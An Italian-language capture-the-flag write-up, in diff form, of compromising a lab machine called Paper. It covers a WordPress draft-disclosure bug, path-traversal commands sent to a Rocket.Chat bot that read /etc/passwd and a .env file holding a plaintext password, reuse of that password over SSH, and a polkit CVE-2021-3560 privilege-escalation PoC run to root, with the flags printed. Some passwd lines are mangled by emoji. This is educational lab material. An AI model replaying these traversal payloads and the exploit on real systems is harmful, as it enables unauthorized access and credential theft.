@@ -1,0 +1,304 @@
+PORT 80 E PORT 443
+
+c'è solo la pagina di default
+
+con gobuster non si trova nulla
+
+provo a vedere se ci sono header strani con burpsuite
+
+e in effetti c'è:
+
+
+X-Backend-Server: office.paper
+
+provo a metterlo in /etc/hosts
+
+andando su http://office.paper/ c'è effettivamente un sito costruito con wordpress
+
+le credenziali di default non funzionano su http://office.paper/wp-login.php
+
+
+seguendo qualche hint data sui post del sito dai "dipendenti" scarico l'immagine che è in uno dei post 
+e vedo che ci sono altree immagini all'interno
+
+binwalk -e handshake-michael-1.jpg 
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             JPEG image data, JFIF standard 1.01
+30            0x1E            TIFF image data, little-endian offset of first image directory: 8
+354           0x162           JPEG image data, JFIF standard 1.01
+
+
+steghide extract -sf handshake-michael-1.jpg 
+
+mi chiede la passphrase che non ho...forse non è la strada giusta
+
+visto che è wordpress provo a usare wpscan
+
+wpscan --url http://office.paper/ --enumerate p,t,u > wpscan.txt
+
+WordPress version 5.2.3 identified (Insecure, released on 2019-09-05)
+
+avevo capito male la hint di prima:
+
+utente nick in un commento dice a utente prisonmike di eleiminare i suoi post dai draft perchè non è sicuro
+non ho accesso ai draft, quello che avevo visto (in cui c'era l'immagine) è un post qualsiasi 
+
+questa versione di wordpress però ha exploit per vedere i draft senza dover essere autenticato:
+
+https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2
+
+
+e infatti:
+
+http://office.paper/index.php/author/prisonmike/?static=1
+
+
+
+
+# Secret Registration URL of new Employee chat system
+
+http://chat.office.paper/register/8qozr226AhkCHZdyY
+
+# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.
+
+# Also, stop looking at my drafts. Jeez!
+
+aggiungo anche chat.office.paper a /etc/hosts
+
+infatti riesco ad andare a 
+
+
+http://chat.office.paper/register/8qozr226AhkCHZdyY
+
+
+
+
+usa rocket.chat, c'è un exploit:
+
+https://www.exploit-db.com/exploits/50108    //mi serve la mail dell'amministratore, tra l'altro non so se la versione è corretta
+
+per rce ma devo essere autenticato quindi registro un account
+
+daerves:password123
+
+
+tra l'altro nella chat c'è un bot:
+
+
+ kellylikescupcakes Hello. I am Recyclops. A bot assigned by Dwight. I will have my revenge on earthlings, but before that, I have to help my Cool friend Dwight to respond to the annoying questions asked by his co-workers, so that he may use his valuable time to... well, not interact with his co-workers.
+Most frequently asked questions include:
+- What time is it?
+- What new files are in your sales directory?
+- Why did the salesman crossed the road?
+- What's the content of file x in your sales directory? etc.
+Please note that I am a beta version and I still have some bugs to be fixed.
+How to use me ? :
+1. Small Talk:
+You can ask me how dwight's weekend was, or did he watched the game last night etc.
+eg: 'recyclops how was your weekend?' or 'recyclops did you watched the game last night?' or 'recyclops what kind of bear is the best?
+2. Joke:
+You can ask me Why the salesman crossed the road.
+eg: 'recyclops why did the salesman crossed the road?'
+<=====The following two features are for those boneheads, who still don't know how to use scp. I'm Looking at you Kevin.=====>
+For security reasons, the access is limited to the Sales folder.
+3. Files:
+eg: 'recyclops get me the file test.txt', or 'recyclops could you send me the file src/test.php' or just 'recyclops file test.txt'
+4. List:
+You can ask me to list the files
+5. Time:
+You can ask me to what the time is
+eg: 'recyclops what time is it?' or just 'recyclops time'
+
+
+
+gli mando un messaggio privato (la chat è readonly)
+
+
+ha LFI
+
+ recyclops list ..
+Bot
+7:14 AM
+Fetching the directory listing of ..
+total 32
+drwx------ 11 dwight dwight 281 Feb 6 07:46 .
+drwxr-xr-x. 3 root root 20 Jan 14 06:50 ..
+lrwxrwxrwx 1 dwight dwight 9 Jul 3 2021 .bash_history -> /dev/null
+-rw-r--r-- 1 dwight dwight 18 May 10 2019 .bash_logout
+-rw-r--r-- 1 dwight dwight 141 May 10 2019 .bash_profile
+-rw-r--r-- 1 dwight dwight 358 Jul 3 2021 .bashrc
+-rwxr-xr-x 1 dwight dwight 1174 Sep 16 2021 bot_restart.sh
+drwx------ 5 dwight dwight 56 Jul 3 2021 .config
+-rw------- 1 dwight dwight 16 Jul 3 2021 .esd_auth
+drwx------ 2 dwight dwight 44 Jul 3 2021 .gnupg
+drwx------ 8 dwight dwight 4096 Sep 16 2021 hubot
+-rw-rw-r-- 1 dwight dwight 18 Sep 16 2021 .hubot_history
+drwx------ 3 dwight dwight 19 Jul 3 2021 .local
+drwxr-xr-x 4 dwight dwight 39 Jul 3 2021 .mozilla
+drwxrwxr-x 5 dwight dwight 83 Jul 3 2021 .npm
+drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 sales
+drwx------ 2 dwight dwight 6 Sep 16 2021 .ssh
+-r-------- 1 dwight dwight 33 May 31 04:10 user.txt
+drwxr-xr-x 2 dwight dwight 24 Sep 16 2021 .vim
+
+
+
+
+ recyclops file ../../../../../../../../../../etc/passwd
+Bot
+7:17 AM
+<!=====Contents of file ../../../../../../../../../../etc/passwd=====>
+root❌0:0:root:/root:/bin/bash
+bin❌1:1:bin:/bin:/sbin/nologin
+daemon❌2:2:daemon:/sbin:/sbin/nologin
+adm❌3:4:adm:/var/adm:/sbin/nologin
+lp❌4:7:lp:/var/spool/lpd:/sbin/nologin
+sync❌5:0:sync:/sbin:/bin/sync
+shutdown❌6:0:shutdown:/sbin:/sbin/shutdown
+halt❌7:0:halt:/sbin:/sbin/halt
+mail❌8:12:mail:/var/spool/mail:/sbin/nologin
+operator❌11:0:operator:/root:/sbin/nologin
+games❌12💯games:/usr/games:/sbin/nologin
+ftp❌14:50:FTP User:/var/ftp:/sbin/nologin
+nobody❌65534:65534:Kernel Overflow User:/:/sbin/nologin
+dbus❌81:81:System message bus:/:/sbin/nologin
+systemd-coredump❌999:997:systemd Core Dumper:/:/sbin/nologin
+systemd-resolve❌193:193:systemd Resolver:/:/sbin/nologin
+tss❌59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
+polkitd❌998:996:User for polkitd:/:/sbin/nologin
+geoclue❌997:994:User for geoclue:/var/lib/geoclue:/sbin/nologin
+rtkit❌172:172:RealtimeKit:/proc:/sbin/nologin
+qemu❌107:107:qemu user:/:/sbin/nologin
+apache❌48:48:Apache:/usr/share/httpd:/sbin/nologin
+cockpit-ws❌996:993:User for cockpit-ws:/:/sbin/nologin
+pulse❌171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
+usbmuxd❌113:113:usbmuxd user:/:/sbin/nologin
+unbound❌995:990:Unbound DNS resolver:/etc/unbound:/sbin/nologin
+rpc❌32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
+gluster❌994:989:GlusterFS daemons:/run/gluster:/sbin/nologin
+chrony❌993:987::/var/lib/chrony:/sbin/nologin
+libstoragemgmt❌992:986:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
+saslauth❌991:76:Saslauthd user:/run/saslauthd:/sbin/nologin
+dnsmasq❌985:985:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin
+radvd❌75:75:radvd user:/:/sbin/nologin
+clevis❌984:983:Clevis Decryption Framework unprivileged user:/var/cache/clevis:/sbin/nologin
+pegasus❌66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin
+sssd❌983:981:User for sssd:/:/sbin/nologin
+colord❌982:980:User for colord:/var/lib/colord:/sbin/nologin
+rpcuser❌29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+setroubleshoot❌981:979::/var/lib/setroubleshoot:/sbin/nologin
+pipewire❌980:978:PipeWire System Daemon:/var/run/pipewire:/sbin/nologin
+gdm❌42:42::/var/lib/gdm:/sbin/nologin
+gnome-initial-setup❌979:977::/run/gnome-initial-setup/:/sbin/nologin
+insights❌978:976:Red Hat Insights:/var/lib/insights:/sbin/nologin
+sshd❌74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+avahi❌70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin
+tcpdump❌72:72::/:/sbin/nologin
+mysql❌27:27:MySQL Server:/var/lib/mysql:/sbin/nologin
+nginx❌977:975:Nginx web server:/var/lib/nginx:/sbin/nologin
+mongod❌976:974:mongod:/var/lib/mongo:/bin/false
+rocketchat❌1001:1001::/home/rocketchat:/bin/bash
+dwight❌1004:1004::/home/dwight:/bin/bash
+
+
+ recyclops file ../hubot/.env
+Bot
+7:19 AM
+<!=====Contents of file ../hubot/.env=====>
+export ROCKETCHAT_URL='http://127.0.0.1:48320'
+export ROCKETCHAT_USER=recyclops
+export ROCKETCHAT_PASSWORD=Queenofblad3s!23
+export ROCKETCHAT_USESSL=false
+export RESPOND_TO_DM=true
+export RESPOND_TO_EDITED=true
+export PORT=8000
+export BIND_ADDRESS=127.0.0.1
+<!=====End of file ../hubot/.env=====>
+
+
+c'è password reuse, infatti con la pwd del bot riesco ad accedere con ssh all'utente dwight
+
+dwight:Queenofblad3s!23
+
+[dwight@paper ~]$ id
+uid=1004(dwight) gid=1004(dwight) groups=1004(dwight)
+[dwight@paper ~]$ 
+
+
+[dwight@paper ~]$ id
+uid=1004(dwight) gid=1004(dwight) groups=1004(dwight)
+[dwight@paper ~]$ cat user.txt
+cec14959a3bae0620a2c0aa68b1d3b4d
+[dwight@paper ~]$ 
+
+
+lancio linpeas per verificare privesc
+
+╔══════════╣ CVEs Check
+Vulnerable to CVE-2021-3560
+
+https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation
+
+
+
+
+
+
+[dwight@paper tmp]$ ./poc.sh
+CVE-2021-3560 Polkit v0.105-26 Linux Privilege Escalation PoC by SecNigma
+
+Original research by Kevin Backhouse
+https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/#vulnerability
+
+USAGE:
+./poc.sh
+Optional Arguments:
+	-h --help
+	-u=Enter custom username to insert (OPTIONAL)
+	-p=Enter custom password to insert (OPTIONAL)
+	-f=y, To skip vulnerability check and force exploitation. (OPTIONAL)
+	-t=Enter custom sleep time, instead of automatic detection (OPTIONAL)
+	Format to enter time: '-t=.004' or '-t=0.004' if you want to set sleep time as 0.004ms 
+Note:
+Equal to symbol (=) after specifying an option is mandatory.
+If you don't specify the options, then the script will automatically detect the possible time and
+will try to insert a new user using that time.
+Default credentials are 'secnigma:secnigmaftw'
+If the exploit ran successfully, then you can login using 'su - secnigma'
+and you can spawn a bash shell as root using 'sudo bash'
+IMPORTANT: THIS IS A TIMING BASED ATTACK. MULTIPLE TRIES ARE USUALLY REQUIRED!!
+
+[dwight@paper tmp]$ ./poc.sh -p=password
+
+[!] Username set as : secnigma
+[!] No Custom Timing specified.
+[!] Timing will be detected Automatically
+[!] Force flag not set.
+[!] Vulnerability checking is ENABLED!
+[!] Starting Vulnerability Checks...
+[!] Checking distribution...
+[!] Detected Linux distribution as "centos"
+[!] Checking if Accountsservice and Gnome-Control-Center is installed
+[+] Accounts service and Gnome-Control-Center Installation Found!!
+[!] Checking if polkit version is vulnerable
+[+] Polkit version appears to be vulnerable!!
+[!] Starting exploit...
+[!] Inserting Username secnigma...
+Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
+[+] Inserted Username secnigma  with UID 1005!
+[!] Inserting password hash...
+[!] It looks like the password insertion was succesful!
+[!] Try to login as the injected user using su - secnigma
+[!] When prompted for password, enter your password 
+[!] If the username is inserted, but the login fails; try running the exploit again.
+[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell!
+[dwight@paper tmp]$ su - secnigma
+Password: 
+[secnigma@paper ~]$ sudo su
+[sudo] password for secnigma: 
+[root@paper secnigma]# cat /root/root.txt 
+a078bafa7e7edc03decb5159d1c2f9c7
+[root@paper secnigma]# 
+
